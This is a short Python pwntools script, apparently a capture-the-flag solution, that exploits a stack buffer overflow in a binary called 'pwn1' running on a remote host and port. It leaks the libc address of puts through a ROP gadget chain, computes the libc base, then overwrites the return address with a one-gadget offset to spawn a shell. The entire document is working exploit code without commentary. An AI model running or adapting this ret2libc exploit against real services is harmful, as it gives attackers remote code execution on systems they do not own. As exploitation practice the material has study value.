from pwn import *

# p = process('./pwn1')
p = remote('34.64.159.111', 12767)
e = ELF('./pwn1')
l = e.libc


prdi = 0x0000000000400933
prsi = 0x0000000000400931
oneshot = 0x45226

payload = 'A'*0x20 + 'A'*8
payload += p64(prdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])

p.send(payload)

base = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - l.symbols['puts']
print hex(base)
payload = 'A'*0x20 + 'A'*8
payload += p64(base+oneshot)
p.send(payload)
p.interactive()